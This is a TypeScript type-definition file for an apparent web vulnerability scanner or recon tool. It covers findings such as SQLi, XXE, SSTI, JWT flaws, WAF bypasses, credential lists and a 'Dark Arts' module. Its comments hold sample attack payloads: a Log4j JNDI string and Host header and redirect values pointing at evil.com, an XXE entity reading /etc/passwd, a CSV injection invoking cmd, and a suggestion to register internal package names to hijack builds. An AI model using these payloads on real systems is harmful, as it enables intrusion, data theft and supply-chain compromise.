
export interface Vulnerability {
  id: string;
  name: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  description: string;
  mitreId?: string; // e.g. T1190
  mitreTactic?: string; // e.g. Initial Access
  location?: string; // URL or path
  evidence?: string;
}

export interface ServicePort {
  port: number;
  service: string;
  version?: string;
  status: 'OPEN' | 'FILTERED' | 'CLOSED';
}

export interface SecurityHeader {
  name: string;
  value: string;
  status: 'MISSING' | 'WEAK' | 'SECURE';
}

export interface Exploit {
  title: string;
  type: string; // e.g., "RCE", "SQLi"
  link?: string; // Reference to ExploitDB or PacketStorm
}

export interface ExploitVector {
  type: 'SQLi' | 'XSS' | 'RCE' | 'LFI';
  parameter: string;
  payload: string;
  targetUrl: string; // The full weaponized URL
  confidence: 'HIGH' | 'MEDIUM' | 'LOW' | 'VERY_LOW';
}

// Generic interface for rich findings that caused the crash
export interface RichFinding {
  type?: string;
  parameter?: string;
  url?: string;
  confidence?: string;
  risk?: string;
  remediation?: string;
  description?: string;
  [key: string]: any; // Allow loose structure
}

export interface CredentialIntel {
  adminPanels: {
    url: string;
    description: string; // e.g. "WordPress Login", "Tomcat Manager"
    defaultCreds?: string; // e.g. "admin / password"
  }[];
  potentialUsernames: string[]; // e.g. "admin", "root", "jsmith"
  passwordWordlist: string[]; // Generated wordlist based on domain/year
}

export interface WafIntel {
  detected: boolean;
  name: string; // Cloudflare, AWS WAF, Akamai
  bypassTechniques: {
    method: string; // e.g. "Header Tampering"
    payload: string; // e.g. "X-Originating-IP: 127.0.0.1"
    description: string;
  }[];
}

export interface SubdomainTakeover {
  subdomain: string;
  provider: string; // e.g., "AWS S3", "Heroku", "GitHub Pages"
  status: 'VULNERABLE' | 'SAFE';
  fingerprint: string; // e.g. "NoSuchBucket", "There is nothing here"
}

export interface ClientSideIntel {
  hardcodedSecrets: {
    name: string; // e.g. "Stripe API Key", "AWS Access Key"
    value: string; // e.g. "pk_live_..."
    location: string; // e.g. "main.js:1402"
    severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  }[];
  dangerousFunctions: {
    function: string; // e.g. "eval()", "document.write()"
    risk: string; // "RCE", "DOM XSS"
    location: string;
  }[];
}

// Supply Chain / Dependency Confusion
export interface SupplyChainRisk {
  packageName: string;
  ecosystem: 'npm' | 'pypi' | 'rubygems' | 'maven';
  location: string; // e.g. "package.json", "main.js"
  riskLevel: 'CRITICAL' | 'HIGH';
  description: string; // e.g. "Internal package name detected. Register this on public registry to hijack build."
}

// SSTI
export interface SSTIVector {
  engine: string; // e.g. "Jinja2", "Pug", "Velocity"
  parameter: string;
  payload: string; // e.g. "{{7*7}}"
  curlCommand: string;
}

// Business Logic
export interface BusinessLogicFlaw {
  flawType: 'Price Manipulation' | 'IDOR' | 'Coupon Replay' | 'Role Bypass';
  endpoint: string;
  description: string; // e.g. "Change 'amount' parameter to negative value."
  severity: 'CRITICAL' | 'HIGH';
}

// Elite Vectors
export interface PrototypePollution {
  parameter: string; // e.g. "__proto__[isAdmin]"
  impact: string; // "DoS", "RCE", "Auth Bypass"
  payload: string; 
  url: string;
}

export interface DeserializationFlaw {
  location: string; // e.g. "Cookie: SESSION_ID", "Param: data"
  format: 'Java' | 'PHP' | 'Python' | 'Node' | '.NET';
  riskLevel: 'CRITICAL';
  description: string; // e.g. "Base64 string detected with Java magic bytes."
}

export interface CachePoisoning {
  header: string; // e.g. "X-Forwarded-Host"
  endpoint: string;
  description: string; // e.g. "Unkeyed input reflected in response."
}

// --- NEW DARK ARTS INTERFACES ---

export interface JwtFlaw {
  location: string;
  flaw: 'None Algorithm' | 'Weak Secret' | 'Key Confusion';
  impact: 'Admin Account Takeover';
}

export interface RequestSmuggling {
  type: 'CL.TE' | 'TE.CL' | 'TE.TE';
  endpoint: string;
  risk: 'Cache Poisoning' | 'Request Hijacking';
}

export interface RaceCondition {
  endpoint: string;
  mechanism: 'Limit Bypass' | 'Double Spending';
  description: string;
}

export interface XxeVector {
  endpoint: string;
  payload: string; // e.g. <!ENTITY xxe SYSTEM "file:///etc/passwd">
  type: 'Blind' | 'Error-based';
}

export interface CorsFlaw {
  origin: string; // e.g. "null" or "evil.com"
  credentials: boolean;
  impact: 'Data Exfiltration';
}

export interface HostHeaderFlaw {
  type: 'Password Reset Poisoning' | 'Cache Poisoning';
  payload: string; // e.g. "Host: evil.com"
}

export interface NoSqlVector {
  parameter: string;
  payload: string; // e.g. {"$ne": null}
  type: 'Auth Bypass' | 'Data Extraction';
}

export interface LdapVector {
  parameter: string;
  payload: string; // e.g. *)(&(objectClass=*))
  type: 'Auth Bypass';
}

export interface BlindSqli {
  parameter: string;
  payload: string; // e.g. ' WAITFOR DELAY '0:0:5'--
  dbType: 'MySQL' | 'PostgreSQL' | 'MSSQL';
}

export interface CsvInjection {
  parameter: string;
  payload: string; // e.g. =cmd|' /C calc'!A0
  context: 'Export Feature';
}

export interface WebSocketFlaw {
  endpoint: string;
  flaw: 'CSWSH' | 'No Auth';
}

export interface SsiVector {
  endpoint: string;
  payload: string; // <!--#exec cmd="ls" -->
}

export interface HiddenParameter {
  name: string; // e.g. debug, test, admin
  location: string;
  type: 'Debug Mechanism';
}

export interface GitExposure {
  url: string; // e.g. /.git/config
  content: 'Config' | 'Logs' | 'Head';
}

export interface BackupFile {
  url: string; // e.g. index.php.bak
  type: 'Source Leak';
}

export interface Log4jVector {
  location: string;
  payload: string; // ${jndi:ldap://evil.com/x}
}

export interface Spring4ShellVector {
  location: string;
  payload: string; // class.module.classLoader...
}

export interface OpenRedirect {
  parameter: string;
  payload: string; // //evil.com
}

export interface MassAssignment {
  endpoint: string;
  parameter: string; // e.g. "role": "admin"
}

export interface PickleFlaw {
  parameter: string;
  description: string;
}

export interface CloudConfigFinding {
  type: 'AWS S3' | 'Azure Blob' | 'GCP Bucket' | 'Config File' | 'Exposed File';
  url: string;
  risk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'INFO';
  description: string;
}

export interface SiteAnalysisData {
  summary: string;
  targetIp?: string;
  techStack: string[];
  reputationScore: number;
  securityGrade: string;
  
  // Recon
  subdomains: string[];
  hiddenDirectories: string[];
  openPorts: ServicePort[];
  wafIntel: WafIntel; 
  
  // Passive Deep OSINT
  mailSecurity?: {
    spf: boolean;
    dmarc: boolean;
    spoofingPossible: boolean;
    findings: string[]; 
  };
  publicDocuments?: (string | RichFinding)[]; 
  archiveEndpoints?: (string | RichFinding)[]; 
  employeeIntel?: string[];

  // OSINT
  emails: string[]; 
  
  // Infrastructure & Leaks
  os?: string; 
  geolocation?: {
    country: string;
    city?: string;
    isp: string;
  };
  whois?: {
    registrar: string;
    createdDate: string;
    expiryDate?: string;
  };
  exposedSecrets?: (string | RichFinding)[]; 
  darkWebMentions?: (string | RichFinding)[];

  // Vulnerabilities & Security
  vulnerabilities: Vulnerability[];
  exploitVectors?: ExploitVector[]; 
  potentialExploits?: Exploit[]; 
  pathTraversal?: (string | RichFinding)[];
  ssrf?: (string | RichFinding)[]; 
  securityHeaders: SecurityHeader[];
  sslInfo: {
    issuer?: string;
    validTo?: string;
    protocol?: string;
    grade?: string;
  };
  
  // Specific Scans
  apiSecurity: (string | RichFinding)[];
  rateLimiting?: (string | RichFinding)[];
  apiEndpoints?: (string | RichFinding)[]; 
  cloudConfig: CloudConfigFinding[]; 
  
  // GraphQL Security
  graphql: boolean;
  graphqlEndpoint?: string;
  graphqlFindings?: string[];

  // Credential Access
  credentialIntel?: CredentialIntel;

  // Client-Side SAST & Takeover
  subdomainTakeover?: SubdomainTakeover[];
  clientSideIntel?: ClientSideIntel;

  // Elite / Zero-Day Vectors
  supplyChainRisks?: SupplyChainRisk[];
  sstiVectors?: SSTIVector[];
  businessLogicFlaws?: BusinessLogicFlaw[];
  
  // Ultra-Elite
  prototypePollution?: PrototypePollution[];
  deserializationFlaws?: DeserializationFlaw[];
  cachePoisoning?: CachePoisoning[];

  // DARK ARTS MODULE (New 20)
  jwtFlaws?: JwtFlaw[];
  requestSmuggling?: RequestSmuggling[];
  raceConditions?: RaceCondition[];
  xxeVectors?: XxeVector[];
  corsFlaws?: CorsFlaw[];
  hostHeaderFlaws?: HostHeaderFlaw[];
  noSqlVectors?: NoSqlVector[];
  ldapVectors?: LdapVector[];
  blindSqli?: BlindSqli[];
  csvInjections?: CsvInjection[];
  webSocketFlaws?: WebSocketFlaw[];
  ssiVectors?: SsiVector[];
  hiddenParameters?: HiddenParameter[];
  gitExposures?: GitExposure[];
  backupFiles?: BackupFile[];
  log4jVectors?: Log4jVector[];
  spring4ShellVectors?: Spring4ShellVector[];
  openRedirects?: OpenRedirect[];
  massAssignments?: MassAssignment[];
  pickleFlaws?: PickleFlaw[];
}

export interface AnalysisState {
  isLoading: boolean;
  data: SiteAnalysisData | null;
  error: string | null;
}

export enum ScanStatus {
  IDLE = 'IDLE',
  SCANNING = 'SCANNING',
  COMPLETE = 'COMPLETE',
  ERROR = 'ERROR'
}

export enum ScanMode {
  PASSIVE = 'PASSIVE',
  AGGRESSIVE = 'AGGRESSIVE'
}
